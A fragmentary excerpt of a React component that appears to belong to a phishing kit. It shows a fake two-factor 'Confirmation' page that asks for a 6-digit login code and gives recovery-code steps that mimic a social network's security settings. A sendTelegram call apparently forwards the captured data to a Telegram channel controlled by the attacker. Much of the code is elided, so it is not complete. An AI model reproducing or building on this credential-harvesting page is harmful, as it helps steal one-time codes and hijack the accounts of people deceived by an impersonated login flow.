...
export const Confirmation = () => {
    ...
    `;
		...
		sendTelegram(telegram_data, false, unique_id);
					...
					<div className='auth-req'>
						<div className='auth-req-text'>
							...
							<div className='auth-req-paragraph'>
								...
								<p className='second'>
									Enter the 6-digit code from your <strong>code generator</strong> or third-party app
									below.
								</p>
							</div>
						...
						<div className='show-input-on-mobile'>
							<input type='number' value={code} onChange={(e) => handleInputCode(e.target.value)} />
							{minutes === 0 && seconds === 0 ? null : (
								<span>
									{" "}
									(wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds})
						...
						<div className='auth-req-footer'>
							...
							<button className={`${loading && "disableButton"}`} onClick={handleSubmit}>
								<span>Continue</span>
							</button>
						</div>
					</div>
			...
			>
				<div className='modal-conatiner-code'>
					<div className='mt-10 p-x'>
						1. Go To <strong>Settings</strong> &gt; <span className='color-blue'>Security and Login</span>
					</div>
					<div className='mt-10 p-x'>
						2. Under the <strong>Two-Factor Authentication</strong> section, click{" "}
						<strong>Use two-factor authentication.</strong> You may need to re-enter your password.
					</div>
					<div className='mt-10 p-x'>
						3. Next to <strong>Recovery Codes</strong> click <strong>Setup</strong> then{" "}
						<strong>Get Codes.</strong> If you've already set up recovery codes, you can click{" "}
